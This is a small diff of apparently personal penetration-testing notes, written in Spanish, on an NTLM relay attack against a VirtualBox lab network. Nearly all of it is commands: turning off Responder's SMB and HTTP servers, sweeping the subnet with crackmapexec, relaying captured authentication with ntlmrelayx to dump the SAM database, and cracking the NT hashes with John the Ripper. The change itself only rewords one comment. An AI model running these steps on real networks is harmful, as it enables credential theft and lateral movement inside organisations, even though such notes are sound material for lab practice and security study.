@@ -5,7 +5,7 @@ nano /etc/responder/responder.conf -> Smb y http a Off -> Acordarse de ponerlo l
 crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt y dominio
 sudo responder -I vboxnet0 -dw
 ntlmrelayx.py -tf ips.txt -smb2support
-y espero a k acceda a un recurson compartido inexistente para obtener la SAM 
+y espero a obtener la SAM 
 john hash --format=NT --show
 john -w pass.txt hash --format=NT
 
